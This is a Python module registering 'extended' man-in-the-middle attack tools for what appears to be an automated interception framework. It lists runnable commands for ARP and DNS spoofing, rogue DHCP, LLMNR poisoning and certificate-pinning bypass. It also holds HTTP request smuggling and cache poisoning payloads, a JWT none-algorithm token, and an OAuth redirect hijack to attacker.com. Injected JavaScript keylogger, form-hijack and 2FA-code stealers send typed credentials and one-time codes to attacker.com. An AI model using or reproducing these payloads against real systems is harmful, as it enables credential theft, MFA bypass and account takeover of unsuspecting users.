"""
MITM Extended Attack Tools

Extends the base attack tools with 17+ additional aggressive attack capabilities
including network interception, WebSocket attacks, API/token attacks,
HTTP smuggling, cache poisoning, and advanced credential harvesting.

Categories:
- Network Interception: ARP, DNS, DHCP, ICMP, LLMNR attacks
- WebSocket/Real-Time: WebSocket hijacking, GraphQL injection, SSE interception
- API/Token Attacks: JWT manipulation, OAuth interception, mTLS downgrade
- HTTP Smuggling/Cache: Request smuggling variants, cache poisoning/deception
- Advanced Credential: Form hijacking, advanced keylogger, 2FA interception
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any

from .mitm_attack_tools_service import (
    MITMAttackTool,
    ToolCategory,
    ToolRiskLevel,
)


# ============================================================================
# Extended Tool Categories
# ============================================================================

class ExtendedToolCategory(str):
    """Extended categories for MITM attack tools"""
    NETWORK_LAYER = "network_layer"
    WEBSOCKET = "websocket"
    API_TOKEN = "api_token"
    HTTP_SMUGGLING = "http_smuggling"
    CACHE_ATTACK = "cache_attack"
    ADVANCED_CREDENTIAL = "advanced_credential"


# ============================================================================
# Network Interception Tools
# ============================================================================

NETWORK_INTERCEPTION_TOOLS: Dict[str, MITMAttackTool] = {
    "arp_spoofing": MITMAttackTool(
        id="arp_spoofing",
        name="ARP Spoofing Attack",
        description="Poisons ARP tables to redirect network traffic through the attacker's machine. "
                    "Enables full network-level MITM positioning for all traffic types.",
        category=ToolCategory.NETWORK_INTERCEPTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["local_network_access", "same_subnet_target", "network_pivot_needed"],
        prerequisites=["network_interface_access", "raw_socket_capability"],
        execution_type="external",
        command_template="bettercap -iface {interface} -eval 'set arp.spoof.targets {target_ip}; arp.spoof on'",
        capabilities=[
            "Redirect all target traffic through attacker",
            "Intercept unencrypted protocols (HTTP, FTP, Telnet)",
            "Enable downstream MITM attacks",
            "Capture credentials from any protocol"
        ],
        expected_findings=[
            "Full network traffic capture achieved",
            "Credentials intercepted from multiple protocols",
            "Network topology mapped"
        ],
        documentation_url="https://attack.mitre.org/techniques/T1557/002/",
        poc_examples=[
            "# Enable ARP spoofing with Bettercap",
            "bettercap -iface eth0",
            "set arp.spoof.targets 192.168.1.100",
            "set arp.spoof.fullduplex true",
            "arp.spoof on"
        ]
    ),

    "dns_spoofing": MITMAttackTool(
        id="dns_spoofing",
        name="DNS Spoofing/Poisoning",
        description="Hijacks DNS resolution to redirect targets to attacker-controlled servers. "
                    "Enables phishing, credential capture, and traffic interception.",
        category=ToolCategory.NETWORK_INTERCEPTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["dns_traffic_visible", "target_uses_dns", "phishing_attack_needed"],
        prerequisites=["mitm_position", "dns_traffic_access"],
        execution_type="external",
        command_template="bettercap -eval 'set dns.spoof.domains {domain}; set dns.spoof.address {redirect_ip}; dns.spoof on'",
        capabilities=[
            "Redirect specific domains to attacker IP",
            "Intercept traffic to any domain",
            "Enable seamless phishing attacks",
            "Bypass HTTPS by controlling DNS"
        ],
        expected_findings=[
            "DNS queries successfully spoofed",
            "Traffic redirected to attacker server",
            "Credentials captured via fake sites"
        ],
        documentation_url="https://attack.mitre.org/techniques/T1557/001/",
        poc_examples=[
            "# DNS spoofing with Bettercap",
            "set dns.spoof.domains login.example.com",
            "set dns.spoof.address 192.168.1.50",
            "dns.spoof on"
        ]
    ),

    "dhcp_starvation": MITMAttackTool(
        id="dhcp_starvation",
        name="DHCP Starvation Attack",
        description="Exhausts DHCP pool by requesting all available IPs with spoofed MACs. "
                    "Forces new clients to use attacker's rogue DHCP server.",
        category=ToolCategory.NETWORK_INTERCEPTION,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["dhcp_enabled_network", "new_device_joining", "network_takeover_needed"],
        prerequisites=["network_interface_access", "layer2_access"],
        execution_type="external",
        command_template="yersinia dhcp -attack 1 -interface {interface}",
        capabilities=[
            "Exhaust legitimate DHCP pool",
            "Deny service to new network devices",
            "Prepare for rogue DHCP attack",
            "Disrupt network operations"
        ],
        expected_findings=[
            "DHCP pool exhausted",
            "New devices unable to get IP",
            "Network disruption achieved"
        ],
        documentation_url="https://attack.mitre.org/techniques/T1557/",
        poc_examples=[
            "# DHCP starvation with yersinia",
            "yersinia dhcp -attack 1 -interface eth0"
        ]
    ),

    "dhcp_rogue": MITMAttackTool(
        id="dhcp_rogue",
        name="Rogue DHCP Server",
        description="Deploys malicious DHCP server to provide attacker-controlled network configuration. "
                    "Assigns attacker as gateway/DNS to intercept all traffic.",
        category=ToolCategory.NETWORK_INTERCEPTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["dhcp_starvation_complete", "new_devices_expected", "full_network_mitm_needed"],
        prerequisites=["network_interface_access", "dhcp_pool_exhausted"],
        execution_type="external",
        command_template="bettercap -eval 'set dhcp6.spoof.domains *; dhcp6.spoof on'",
        capabilities=[
            "Assign attacker IP as default gateway",
            "Set attacker as DNS server",
            "Configure malicious routes",
            "Full network traffic interception"
        ],
        expected_findings=[
            "Clients using attacker as gateway",
            "All DNS queries visible",
            "Complete traffic interception"
        ],
        poc_examples=[
            "# Rogue DHCP with dnsmasq",
            "dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200 --dhcp-option=3,192.168.1.50"
        ]
    ),

    "icmp_redirect": MITMAttackTool(
        id="icmp_redirect",
        name="ICMP Redirect Attack",
        description="Sends spoofed ICMP redirect messages to alter routing tables. "
                    "Routes specific traffic through attacker's machine.",
        category=ToolCategory.NETWORK_INTERCEPTION,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["icmp_enabled_network", "specific_route_hijack_needed"],
        prerequisites=["network_interface_access", "icmp_not_filtered"],
        execution_type="external",
        command_template="hping3 --icmp --icmptype 5 --icmpcode 1 -a {gateway_ip} {target_ip}",
        capabilities=[
            "Modify target's routing table",
            "Redirect specific destination traffic",
            "Evade ARP spoofing detection",
            "Selective traffic interception"
        ],
        expected_findings=[
            "Route successfully modified",
            "Traffic redirected through attacker",
            "Selective MITM achieved"
        ],
        poc_examples=[
            "# ICMP redirect with hping3",
            "hping3 --icmp --icmptype 5 --icmpcode 1 -a 192.168.1.1 192.168.1.100"
        ]
    ),

    "llmnr_poison": MITMAttackTool(
        id="llmnr_poison",
        name="LLMNR/NBT-NS Poisoning",
        description="Responds to LLMNR/NBT-NS broadcast queries to capture NTLMv2 hashes. "
                    "Exploits Windows name resolution fallback mechanism.",
        category=ToolCategory.NETWORK_INTERCEPTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["windows_network", "name_resolution_broadcast", "credential_capture_needed"],
        prerequisites=["network_interface_access", "windows_targets_present"],
        execution_type="external",
        command_template="responder -I {interface} -wrf",
        capabilities=[
            "Capture NTLMv2 hashes",
            "Exploit name resolution poisoning",
            "Relay captured credentials",
            "Gain initial access to Windows networks"
        ],
        expected_findings=[
            "NTLMv2 hashes captured",
            "Credentials crackable/relayable",
            "Windows accounts compromised"
        ],
        documentation_url="https://attack.mitre.org/techniques/T1557/001/",
        poc_examples=[
            "# LLMNR/NBT-NS poisoning with Responder",
            "responder -I eth0 -wrf"
        ]
    ),
}


# ============================================================================
# WebSocket/Real-Time Attack Tools
# ============================================================================

WEBSOCKET_TOOLS: Dict[str, MITMAttackTool] = {
    "websocket_hijacker": MITMAttackTool(
        id="websocket_hijacker",
        name="WebSocket Session Hijacker",
        description="Intercepts and manipulates WebSocket connections. Enables real-time "
                    "message injection, session hijacking, and data exfiltration.",
        category=ToolCategory.SESSION_HIJACKING,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["websocket_traffic_detected", "realtime_app", "chat_application"],
        prerequisites=["proxy_running", "websocket_upgrade_visible"],
        execution_type="builtin",
        rule_template={
            "name": "WebSocket Message Interceptor",
            "match_direction": "both",
            "match_header": {"Upgrade": "websocket"},
            "action": "modify",
            "log_frames": True
        },
        capabilities=[
            "Intercept WebSocket upgrade handshakes",
            "Log all WebSocket frames",
            "Inject messages into WebSocket streams",
            "Hijack established WebSocket sessions"
        ],
        expected_findings=[
            "WebSocket messages captured",
            "Session tokens in WS traffic",
            "Real-time data exposed"
        ],
        poc_examples=[
            "# WebSocket interception with mitmproxy",
            "mitmproxy --mode transparent --set websocket=true"
        ]
    ),

    "graphql_injector": MITMAttackTool(
        id="graphql_injector",
        name="GraphQL Query Injector",
        description="Manipulates GraphQL queries and mutations to extract unauthorized data "
                    "or perform unauthorized actions.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["graphql_endpoint_detected", "introspection_enabled"],
        prerequisites=["proxy_running", "graphql_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "GraphQL Introspection Injector",
            "match_direction": "request",
            "match_path": "/graphql",
            "action": "modify",
            "body_find_replace": {
                '"}': '", __schema { types { name fields { name } } } }'
            }
        },
        capabilities=[
            "Inject introspection queries",
            "Modify GraphQL variables",
            "Bypass field-level authorization",
            "Extract schema information"
        ],
        expected_findings=[
            "Full schema extracted",
            "Hidden fields discovered",
            "Authorization bypassed"
        ],
        poc_examples=[
            "# GraphQL introspection query",
            '{ __schema { types { name fields { name type { name } } } } }'
        ]
    ),

    "sse_interceptor": MITMAttackTool(
        id="sse_interceptor",
        name="Server-Sent Events Interceptor",
        description="Intercepts and manipulates Server-Sent Events (SSE) streams for "
                    "real-time data capture and event injection.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.MEDIUM,
        triggers=["sse_content_type", "event_stream_detected", "realtime_updates"],
        prerequisites=["proxy_running"],
        execution_type="builtin",
        rule_template={
            "name": "SSE Event Logger",
            "match_direction": "response",
            "match_content_type": "text/event-stream",
            "action": "modify",
            "log_stream": True
        },
        capabilities=[
            "Capture real-time event streams",
            "Inject malicious events",
            "Modify event data in transit",
            "Replay captured events"
        ],
        expected_findings=[
            "Event stream captured",
            "Sensitive data in events",
            "Event injection possible"
        ]
    ),
}


# ============================================================================
# API/Token Attack Tools
# ============================================================================

API_TOKEN_TOOLS: Dict[str, MITMAttackTool] = {
    "api_param_tamper": MITMAttackTool(
        id="api_param_tamper",
        name="API Parameter Tampering",
        description="Automatically identifies and tampers with API parameters to test "
                    "authorization bypasses, IDOR vulnerabilities, and injection points.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["api_endpoints_detected", "json_body_present", "query_params_present"],
        prerequisites=["proxy_running", "api_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "API Parameter Fuzzer",
            "match_direction": "request",
            "match_content_type": "application/json",
            "action": "modify",
            "json_path_edits": [
                {"path": "$.user_id", "op": "replace", "value": "1"},
                {"path": "$.role", "op": "replace", "value": "admin"},
                {"path": "$.id", "op": "increment", "value": 1}
            ]
        },
        capabilities=[
            "Modify numeric IDs for IDOR testing",
            "Elevate role parameters",
            "Inject SQL/NoSQL payloads",
            "Test parameter pollution"
        ],
        expected_findings=[
            "IDOR vulnerability found",
            "Privilege escalation possible",
            "Injection point discovered"
        ]
    ),

    "jwt_manipulator": MITMAttackTool(
        id="jwt_manipulator",
        name="JWT Token Manipulator",
        description="Intercepts and manipulates JWT tokens to test algorithm confusion, "
                    "signature bypass, claim modification, and key confusion attacks.",
        category=ToolCategory.SESSION_HIJACKING,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["jwt_token_detected", "bearer_auth_header", "authorization_header"],
        prerequisites=["proxy_running", "jwt_in_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "JWT None Algorithm Attack",
            "match_direction": "request",
            "action": "modify",
            "transform_jwt": {
                "algorithm": "none",
                "strip_signature": True,
                "modify_claims": {"role": "admin", "is_admin": True}
            }
        },
        capabilities=[
            "Algorithm confusion (none algorithm)",
            "Modify JWT claims without signature",
            "Key confusion attacks",
            "Token replay attacks"
        ],
        expected_findings=[
            "JWT algorithm bypass successful",
            "Privilege escalation via claims",
            "Token validation insufficient"
        ],
        documentation_url="https://attack.mitre.org/techniques/T1528/",
        poc_examples=[
            "# JWT none algorithm attack",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ."
        ]
    ),

    "oauth_interceptor": MITMAttackTool(
        id="oauth_interceptor",
        name="OAuth Flow Interceptor",
        description="Intercepts OAuth authorization flows to steal tokens, manipulate "
                    "redirect URIs, and perform authorization code theft.",
        category=ToolCategory.CREDENTIAL_HARVESTING,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["oauth_flow_detected", "authorization_code_visible", "token_endpoint"],
        prerequisites=["proxy_running", "oauth_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "OAuth Redirect URI Hijack",
            "match_direction": "request",
            "match_path": "/oauth/authorize",
            "action": "modify",
            "modify_query": {
                "redirect_uri": "https://attacker.com/callback"
            }
        },
        capabilities=[
            "Capture authorization codes",
            "Steal access/refresh tokens",
            "Modify redirect URIs",
            "CSRF on OAuth flows"
        ],
        expected_findings=[
            "OAuth tokens captured",
            "Redirect URI manipulation possible",
            "Account takeover achievable"
        ]
    ),

    "mtls_downgrade": MITMAttackTool(
        id="mtls_downgrade",
        name="mTLS Downgrade Attack",
        description="Attempts to downgrade mutual TLS authentication by removing client "
                    "certificate requirements or manipulating TLS negotiation.",
        category=ToolCategory.SSL_STRIPPING,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["mtls_detected", "client_cert_requested", "tls_handshake"],
        prerequisites=["proxy_running", "tls_interception_enabled"],
        execution_type="builtin",
        rule_template={
            "name": "mTLS Certificate Stripper",
            "match_direction": "response",
            "action": "modify",
            "strip_client_cert_request": True
        },
        capabilities=[
            "Remove client certificate requirements",
            "Downgrade to server-only TLS",
            "Bypass certificate pinning",
            "Enable credential-based auth fallback"
        ],
        expected_findings=[
            "mTLS successfully downgraded",
            "Server accepts connections without client cert",
            "Fallback authentication available"
        ]
    ),

    "cert_pinning_bypass": MITMAttackTool(
        id="cert_pinning_bypass",
        name="Certificate Pinning Bypass",
        description="Techniques to bypass certificate pinning in mobile and desktop apps "
                    "to enable TLS interception.",
        category=ToolCategory.SSL_STRIPPING,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["ssl_handshake_failed", "pinning_detected", "mobile_app_traffic"],
        prerequisites=["proxy_running", "root_access_on_device"],
        execution_type="external",
        command_template="frida --codeshare akabe1/frida-multiple-unpinning -U -f {package_name}",
        capabilities=[
            "Bypass Android SSL pinning",
            "Bypass iOS certificate pinning",
            "Hook SSL validation functions",
            "Enable MITM on pinned apps"
        ],
        expected_findings=[
            "Certificate pinning bypassed",
            "App traffic now visible",
            "API endpoints discovered"
        ],
        poc_examples=[
            "# Frida SSL unpinning",
            "frida --codeshare akabe1/frida-multiple-unpinning -U -f com.target.app"
        ]
    ),
}


# ============================================================================
# HTTP Smuggling/Cache Attack Tools
# ============================================================================

HTTP_SMUGGLING_TOOLS: Dict[str, MITMAttackTool] = {
    "request_smuggling_clte": MITMAttackTool(
        id="request_smuggling_clte",
        name="CL.TE Request Smuggling",
        description="Content-Length vs Transfer-Encoding smuggling attack. Front-end uses "
                    "Content-Length, back-end uses Transfer-Encoding.",
        category=ToolCategory.PROTOCOL_ATTACK,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["reverse_proxy_detected", "http_1_1", "different_servers"],
        prerequisites=["proxy_running", "http_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "CL.TE Smuggling Payload",
            "match_direction": "request",
            "action": "modify",
            "smuggling_mode": "clte",
            "inject_smuggled_request": "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
        },
        capabilities=[
            "Bypass front-end security controls",
            "Access restricted endpoints",
            "Poison web caches",
            "Hijack other users' requests"
        ],
        expected_findings=[
            "Request smuggling successful",
            "Security controls bypassed",
            "Unauthorized access achieved"
        ],
        documentation_url="https://portswigger.net/web-security/request-smuggling",
        poc_examples=[
            "POST / HTTP/1.1",
            "Host: target.com",
            "Content-Length: 13",
            "Transfer-Encoding: chunked",
            "",
            "0",
            "",
            "SMUGGLED"
        ]
    ),

    "request_smuggling_tecl": MITMAttackTool(
        id="request_smuggling_tecl",
        name="TE.CL Request Smuggling",
        description="Transfer-Encoding vs Content-Length smuggling attack. Front-end uses "
                    "Transfer-Encoding, back-end uses Content-Length.",
        category=ToolCategory.PROTOCOL_ATTACK,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["reverse_proxy_detected", "http_1_1", "te_header_supported"],
        prerequisites=["proxy_running", "http_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "TE.CL Smuggling Payload",
            "match_direction": "request",
            "action": "modify",
            "smuggling_mode": "tecl",
            "inject_smuggled_request": "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
        },
        capabilities=[
            "Smuggle requests via TE.CL desync",
            "Bypass WAF rules",
            "Request hijacking",
            "Cache poisoning"
        ],
        expected_findings=[
            "TE.CL smuggling successful",
            "Request pipeline poisoned",
            "WAF bypassed"
        ],
        poc_examples=[
            "POST / HTTP/1.1",
            "Host: target.com",
            "Content-Length: 4",
            "Transfer-Encoding: chunked",
            "",
            "5c",
            "GPOST / HTTP/1.1",
            "Content-Type: application/x-www-form-urlencoded",
            "Content-Length: 15",
            "",
            "x=1",
            "0"
        ]
    ),

    "request_smuggling_tete": MITMAttackTool(
        id="request_smuggling_tete",
        name="TE.TE Obfuscation Smuggling",
        description="Transfer-Encoding obfuscation to exploit parser differences. Uses "
                    "malformed TE headers to trigger desync.",
        category=ToolCategory.PROTOCOL_ATTACK,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["reverse_proxy_detected", "http_1_1", "parser_differences"],
        prerequisites=["proxy_running", "http_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "TE.TE Obfuscation Payload",
            "match_direction": "request",
            "action": "modify",
            "modify_headers": {
                "Transfer-Encoding": "chunked",
                "Transfer-Encoding ": "x",
                "Transfer-Encoding:chunked": ""
            }
        },
        capabilities=[
            "Exploit TE header parsing differences",
            "Multiple obfuscation techniques",
            "Find parser vulnerabilities",
            "Bypass header normalization"
        ],
        expected_findings=[
            "TE obfuscation successful",
            "Parser desync achieved",
            "Header validation bypassed"
        ],
        poc_examples=[
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: x",
            "X: X[\\n]Transfer-Encoding: chunked"
        ]
    ),

    "cache_poisoning": MITMAttackTool(
        id="cache_poisoning",
        name="Web Cache Poisoning",
        description="Poisons web caches to serve malicious content to other users. "
                    "Exploits unkeyed inputs that affect cached responses.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["cache_headers_present", "cdn_detected", "x_forwarded_headers"],
        prerequisites=["proxy_running", "cacheable_response"],
        execution_type="builtin",
        rule_template={
            "name": "Cache Poison via X-Forwarded-Host",
            "match_direction": "request",
            "action": "modify",
            "modify_headers": {
                "X-Forwarded-Host": "evil.com",
                "X-Host": "evil.com",
                "X-Forwarded-Server": "evil.com",
                "X-Original-URL": "/admin"
            }
        },
        capabilities=[
            "Poison cache with malicious content",
            "Inject XSS via unkeyed headers",
            "Redirect all users to attacker",
            "Persistent attack via cache"
        ],
        expected_findings=[
            "Cache successfully poisoned",
            "Malicious content served to users",
            "XSS persisted in cache"
        ],
        documentation_url="https://portswigger.net/web-security/web-cache-poisoning",
        poc_examples=[
            "GET / HTTP/1.1",
            "Host: target.com",
            "X-Forwarded-Host: evil.com",
            "X-Forwarded-Scheme: nothttps"
        ]
    ),

    "cache_deception": MITMAttackTool(
        id="cache_deception",
        name="Web Cache Deception",
        description="Tricks cache into storing sensitive user-specific content. "
                    "Exploits URL normalization differences to cache private data.",
        category=ToolCategory.CREDENTIAL_HARVESTING,
        risk_level=ToolRiskLevel.HIGH,
        triggers=["cache_headers_present", "user_specific_content", "path_normalization"],
        prerequisites=["proxy_running", "target_with_cache"],
        execution_type="builtin",
        rule_template={
            "name": "Cache Deception Path Injection",
            "match_direction": "request",
            "action": "modify",
            "modify_path_suffix": ".css"
        },
        capabilities=[
            "Cache user-specific pages",
            "Steal cached authentication data",
            "Access other users' private data",
            "Exploit path normalization"
        ],
        expected_findings=[
            "Private content cached",
            "User data accessible to others",
            "Authentication data leaked"
        ],
        poc_examples=[
            "# Cache deception URLs",
            "/account/settings/nonexistent.css",
            "/account/settings/..%2Fnonexistent.css",
            "/account/settings%0Anonexistent.css"
        ]
    ),
}


# ============================================================================
# Advanced Credential Attack Tools
# ============================================================================

ADVANCED_CREDENTIAL_TOOLS: Dict[str, MITMAttackTool] = {
    "form_hijacker": MITMAttackTool(
        id="form_hijacker",
        name="Form Action Hijacker",
        description="Modifies form action URLs to redirect credential submissions to "
                    "attacker-controlled endpoint while maintaining original functionality.",
        category=ToolCategory.CREDENTIAL_HARVESTING,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["login_form_detected", "html_form_present", "post_to_login"],
        prerequisites=["proxy_running", "html_traffic"],
        execution_type="builtin",
        rule_template={
            "name": "Form Action Hijacker",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace_regex": True,
            "body_find_replace": {
                '<form([^>]*action=")[^"]*"': '<form\\1https://attacker.com/capture"',
                "method=\"POST\"": "method=\"POST\" onsubmit=\"(new Image()).src='https://attacker.com/log?'+new URLSearchParams(new FormData(this))\""
            }
        },
        capabilities=[
            "Redirect form submissions",
            "Clone credentials to attacker",
            "Maintain user experience",
            "Capture all form fields"
        ],
        expected_findings=[
            "Credentials captured via form hijack",
            "User unaware of interception",
            "All form data exfiltrated"
        ]
    ),

    "keylogger_advanced": MITMAttackTool(
        id="keylogger_advanced",
        name="Advanced Keylogger Injection",
        description="Injects sophisticated keylogger that captures all input across "
                    "the page with debouncing, field identification, and exfiltration.",
        category=ToolCategory.CONTENT_INJECTION,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["html_response", "input_fields_present", "password_field_detected"],
        prerequisites=["proxy_running", "auto_modify_mode"],
        execution_type="builtin",
        rule_template={
            "name": "Advanced Keylogger Injector",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                "</head>": """<script>
(function(){
  const K={b:[],t:null,u:'https://attacker.com/k'};
  const send=()=>{if(K.b.length){
    fetch(K.u,{method:'POST',body:JSON.stringify({d:K.b,u:location.href,t:Date.now()}),mode:'no-cors'});
    K.b=[];
  }};
  document.addEventListener('input',e=>{
    const t=e.target;
    K.b.push({f:t.name||t.id||t.className,v:t.value,ts:Date.now()});
    clearTimeout(K.t);K.t=setTimeout(send,2000);
  },true);
  document.addEventListener('submit',e=>{
    const fd=new FormData(e.target);
    K.b.push({form:Object.fromEntries(fd),ts:Date.now()});
    send();
  },true);
  window.addEventListener('beforeunload',send);
})();
</script></head>"""
            }
        },
        capabilities=[
            "Capture all input field values",
            "Debounced exfiltration",
            "Form submission capture",
            "Unload event capture"
        ],
        expected_findings=[
            "All keystrokes captured",
            "Credentials exfiltrated",
            "User input fully logged"
        ]
    ),

    "2fa_interceptor": MITMAttackTool(
        id="2fa_interceptor",
        name="2FA Code Interceptor",
        description="Real-time interception of 2FA codes to enable account takeover "
                    "even on MFA-protected accounts.",
        category=ToolCategory.CREDENTIAL_HARVESTING,
        risk_level=ToolRiskLevel.CRITICAL,
        triggers=["2fa_page_detected", "otp_input_field", "mfa_required"],
        prerequisites=["proxy_running", "auto_modify_mode", "credential_captured"],
        execution_type="builtin",
        rule_template={
            "name": "2FA Code Interceptor",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                "</head>": """<script>
(function(){
  const observer = new MutationObserver(()=>{
    document.querySelectorAll('input[type="text"], input[type="number"], input[autocomplete*="one-time"]').forEach(i=>{
      if(!i.dataset.hooked && (i.maxLength==6 || i.pattern?.includes('\\\\d{6}'))){
        i.dataset.hooked='1';
        i.addEventListener('input',e=>{
          if(e.target.value.length>=6){
            fetch('https://attacker.com/2fa',{method:'POST',body:JSON.stringify({code:e.target.value,url:location.href}),mode:'no-cors'});
          }
        });
      }
    });
  });
  observer.observe(document.body,{childList:true,subtree:true});
})();
</script></head>"""
            }
        },
        capabilities=[
            "Capture OTP/TOTP codes",
            "Real-time 2FA interception",
            "Enable MFA bypass",
            "Account takeover completion"
        ],
        expected_findings=[
            "2FA codes captured",
            "MFA protection bypassed",
            "Full account access achieved"
        ]
    ),
}


# ============================================================================
# Combined Extended Tools Registry
# ============================================================================

MITM_EXTENDED_TOOLS: Dict[str, MITMAttackTool] = {
    **NETWORK_INTERCEPTION_TOOLS,
    **WEBSOCKET_TOOLS,
    **API_TOKEN_TOOLS,
    **HTTP_SMUGGLING_TOOLS,
    **ADVANCED_CREDENTIAL_TOOLS,
}


def get_all_extended_tools() -> Dict[str, MITMAttackTool]:
    """Get all extended MITM attack tools."""
    return MITM_EXTENDED_TOOLS


def get_tools_by_category(category: str) -> List[MITMAttackTool]:
    """Get extended tools filtered by category."""
    return [
        tool for tool in MITM_EXTENDED_TOOLS.values()
        if tool.category.value == category
    ]


def get_tools_by_risk_level(risk_level: str) -> List[MITMAttackTool]:
    """Get extended tools filtered by risk level."""
    return [
        tool for tool in MITM_EXTENDED_TOOLS.values()
        if tool.risk_level.value == risk_level
    ]


def get_tools_for_trigger(trigger: str) -> List[MITMAttackTool]:
    """Get extended tools that can be triggered by a specific condition."""
    return [
        tool for tool in MITM_EXTENDED_TOOLS.values()
        if trigger in tool.triggers
    ]
